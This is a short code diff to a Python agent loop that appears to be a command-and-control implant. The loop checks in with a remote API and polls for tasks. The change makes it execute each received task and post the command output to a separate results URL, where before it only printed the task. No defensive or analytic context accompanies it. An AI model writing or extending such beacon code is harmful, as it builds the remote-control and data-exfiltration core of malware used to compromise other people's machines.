@@ -3,10 +3,11 @@ import socket
 import config
 import state
 import comms
+import tasking
 
 
 def run_agent_loop():
-    api_url, sleep_interval = config.load_config()
+    api_url, sleep_interval, results_url = config.load_config()
 
     while True:
         agent_id = state.get_agent_id()
@@ -27,7 +28,9 @@ def run_agent_loop():
             if "task" in response_checkin:
                 received_task = response_checkin["task"]
                 if received_task and received_task != "no-task-for-now":
-                    print(f"\n[TASK RECEIVED]: {received_task}")
+                    command_out = tasking.execute_task(received_task)
+                    comms.send_results(results_url, agent_id, command_out)
+                    print("[INFO] Task executed and result sent.")
 
         else:
             print(f"Check-in failed. Trying again in {sleep_interval}s.")
